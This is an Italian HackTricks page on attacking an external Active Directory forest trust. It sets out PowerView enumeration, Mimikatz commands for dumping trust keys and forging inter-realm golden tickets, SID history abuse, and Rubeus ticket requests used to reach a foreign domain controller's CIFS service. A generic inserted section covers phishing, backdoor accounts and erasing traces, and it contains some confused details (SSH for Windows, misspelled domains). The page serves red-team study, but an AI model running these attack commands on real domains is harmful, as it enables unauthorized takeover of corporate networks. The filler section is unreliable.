# Dominio Forestale Esterno - Unidirezionale (In ingresso) o bidirezionale

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

In questo scenario, un dominio esterno ti sta fidando (o entrambi si fidano l'uno dell'altro), quindi puoi ottenere un certo tipo di accesso su di esso.

## Enumerazione

Prima di tutto, è necessario **enumerare** la **fiducia**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Nella precedente enumerazione è stato scoperto che l'utente **`crossuser`** è all'interno del gruppo **`External Admins`** che ha accesso **Admin** all'interno del **DC del dominio esterno**.

## Accesso Iniziale

Se **non** hai trovato alcun accesso **speciale** del tuo utente nell'altro dominio, puoi comunque tornare alla Metodologia AD e provare a **elevare i privilegi da un utente non privilegiato** (ad esempio, utilizzando kerberoasting):

Puoi utilizzare le funzioni di **Powerview** per **enumerare** l'**altro dominio** utilizzando il parametro `-Domain` come segue:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## Impersonazione

### Accesso

Utilizzando un metodo regolare con le credenziali dell'utente che ha accesso al dominio esterno, dovresti essere in grado di accedere a:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuso di SID History

È anche possibile abusare di [**SID History**](sid-history-injection.md) attraverso una trust forestale.

Se un utente viene migrato **da una foresta all'altra** e **SID Filtering non è abilitato**, diventa possibile **aggiungere un SID dall'altra foresta**, e questo **SID** verrà **aggiunto** al **token dell'utente** durante l'autenticazione **attraverso la trust**.

{% hint style="warning" %}
Come promemoria, è possibile ottenere la chiave di firma con
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Potresti **firmare con** la chiave **affidabile** un **TGT impersonando** l'utente del dominio corrente.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Impersonazione completa dell'utente

In questa sezione, esploreremo una metodologia completa per impersonare un utente in un dominio forestale esterno con un flusso di traffico a senso unico in entrata. Questo approccio ci consentirà di ottenere l'accesso completo all'account dell'utente e sfruttarlo per scopi di hacking.

#### 1. Identificazione dell'utente target

Prima di tutto, dobbiamo identificare l'utente target che desideriamo impersonare. Questo può essere fatto attraverso la raccolta di informazioni sul dominio forestale esterno, come ad esempio l'elenco degli utenti e le loro autorizzazioni.

#### 2. Raccolta delle credenziali dell'utente target

Una volta identificato l'utente target, dobbiamo raccogliere le sue credenziali per poterle utilizzare per l'accesso. Ci sono diverse tecniche che possiamo utilizzare per ottenere le credenziali, come il phishing, l'ingegneria sociale o l'utilizzo di strumenti di cracking delle password.

#### 3. Accesso al dominio forestale esterno

Una volta ottenute le credenziali dell'utente target, possiamo utilizzarle per accedere al dominio forestale esterno. Questo può essere fatto tramite l'utilizzo di strumenti come RDP (Remote Desktop Protocol) o SSH (Secure Shell).

#### 4. Impersonazione dell'utente target

Una volta connessi al dominio forestale esterno, possiamo impersonare l'utente target utilizzando le sue credenziali. Questo ci darà l'accesso completo all'account dell'utente e ci permetterà di svolgere attività come inviare e-mail, accedere a file sensibili o eseguire comandi privilegiati.

#### 5. Mantenimento dell'accesso

Una volta ottenuto l'accesso all'account dell'utente target, è importante mantenere l'accesso per poter continuare a sfruttare l'account per scopi di hacking. Ciò può essere fatto attraverso l'utilizzo di tecniche come la creazione di account di backdoor o l'utilizzo di strumenti di persistenza.

#### 6. Pulizia delle tracce

Infine, è importante pulire le tracce delle nostre attività per evitare di essere scoperti. Ciò può essere fatto attraverso l'utilizzo di strumenti di eliminazione delle tracce o l'esecuzione di comandi per rimuovere le prove delle nostre attività.

Seguendo questa metodologia, saremo in grado di impersonare con successo un utente in un dominio forestale esterno con un flusso di traffico a senso unico in entrata. Tuttavia, è importante ricordare che l'uso di queste tecniche per scopi illegali o non autorizzati è un reato e può comportare conseguenze legali.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in un'azienda di **sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
